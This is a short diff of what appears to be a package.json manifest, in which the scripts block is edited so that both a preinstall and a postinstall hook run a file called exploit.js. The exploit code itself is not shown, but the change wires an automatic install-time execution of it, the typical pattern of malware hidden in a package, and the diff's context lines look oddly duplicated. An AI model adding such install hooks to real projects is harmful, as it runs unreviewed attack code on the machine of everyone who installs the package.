@@ -1,6 +1,6 @@
 {
   "scripts": {
-    "postinstall": "node exploit.js",
+    "preinstall": "node exploit.js",
     "postinstall": "node exploit.js"
   }
 }
